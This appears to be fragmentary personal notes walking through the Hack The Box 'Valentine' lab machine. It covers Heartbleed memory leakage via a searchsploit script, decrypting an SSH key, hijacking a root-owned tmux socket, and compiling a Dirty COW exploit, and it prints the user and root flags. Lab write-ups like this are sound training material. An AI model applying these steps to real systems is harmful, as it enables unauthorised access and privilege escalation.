Machine: https://app.hackthebox.com/machines/127
IP: 10.10.10.79
...
Decode this and got SSH key for hype but we need passphrase still
...
https://0xdf.gitlab.io/2018/07/28/htb-valentine.html#ssh-access

Picture on the /index page indicates heartbleed as 0xdf mentioned

`searchsploit -m multiple/remote/32745.py`

Run the script and filter all `00` hex
...
```
  ...
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D C3  mV0aGVoeXBlCg==.
```

We go this chunk which contains base64 and the result also contains some part of the private key
...
Decrypt RSA key with this passphrase

`openssl rsa -in key -out hype_key_decrypted
`
...
If Error (sign_and_send_pubkey: no mutual signature supported):
...
user.txt 04fcb3676e387dca2ae28a95a2ef0119
...
We see this in home directory

`-rw-r--r--  1 root root    39 Dec 13  2017 .tmux.conf
`

Check process and see tmux is running by root

`root       1009  0.0  0.1  26416  1676 ?        Ss   03:40   0:01 /usr/bin/tmux -S /.devs/dev_sess`


This file writable by hype group (Our group)

`srw-rw---- 1 root hype 0 Feb 19 03:40 /.devs/dev_sess
`
...
root.txt 2189335a633c9c07fc0580e94f095262
...
Compile on victim machine to avoid library issue

```
gcc -pthread dirty.c -o c -lcrypt
chmod +x c
./c
...
![image](https://github.com/Leng-Phirun/OSCP_Prep_TJNull/assets/100512862/86498cb7-9218-4bb0-820d-018619fa1ed6)
